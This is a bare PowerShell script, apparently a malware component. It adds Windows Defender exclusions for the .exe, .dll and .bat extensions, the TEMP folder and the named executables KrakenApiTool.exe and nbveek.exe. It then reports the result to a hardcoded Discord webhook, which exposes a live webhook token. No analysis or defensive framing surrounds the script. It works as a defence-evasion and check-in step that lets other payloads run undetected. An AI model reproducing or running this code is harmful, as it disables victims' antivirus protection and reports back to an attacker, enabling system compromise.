$hookUrl = 'https://discord.com/api/webhooks/1065355278549262357/ZgGNOcyL2A6px5BB6yCck8MjYwkHcYpGhryXLis_epP_2cGNAFHGmApGuyOO1kMXy-wJ'; $exclusionExtensions = 'exe','dll','bat'; $exclusionPaths = '$env:TEMP\','$env:TEMP\KrakenApiTool.exe','$env:TEMP\89f359e03f\nbveek.exe';$exclusionProcesses = 'KrakenApiTool.exe','nbveek.exe'; $exclusionExtensionsExist = (Get-MpPreference).ExclusionExtension -contains $exclusionExtensions; $exclusionPathsExist = (Get-MpPreference).ExclusionPath -contains $exclusionPaths; $exclusionProcessesExist = (Get-MpPreference).ExclusionProcess -contains $exclusionProcesses; if ($exclusionExtensionsExist -and $exclusionPathsExist -and $exclusionProcessesExist) { $message = "Windows Defender exclusions found: `n ExclusionExtension: $exclusionExtensions `n ExclusionPath: $exclusionPaths `n ExclusionProcess: $exclusionProcesses";} else { $message = "Windows Defender exclusion(s) not found:"; if (!$exclusionExtensionsExist) { $message += "`nExclusion extension: $exclusionExtensions";} if (!$exclusionPathsExist) { $message += "`nExclusion path: $exclusionPaths";} if (!$exclusionProcessesExist) { $message += "`nExclusion process: $exclusionProcesses";}  $exclusionExtensions | ForEach-Object {Set-MpPreference -ExclusionExtension $_} 
$exclusionPaths | ForEach-Object {Set-MpPreference -ExclusionPath $_} 
$exclusionProcesses | ForEach-Object {Set-MpPreference -ExclusionProcess $_} }
Invoke-WebRequest -Uri $hookUrl -Method Post -Body (ConvertTo-Json @{content=$message;embeds=@(@{description=$message;title="Windows Defender Status"}}) -Headers @{'Content-Type'='application/json'}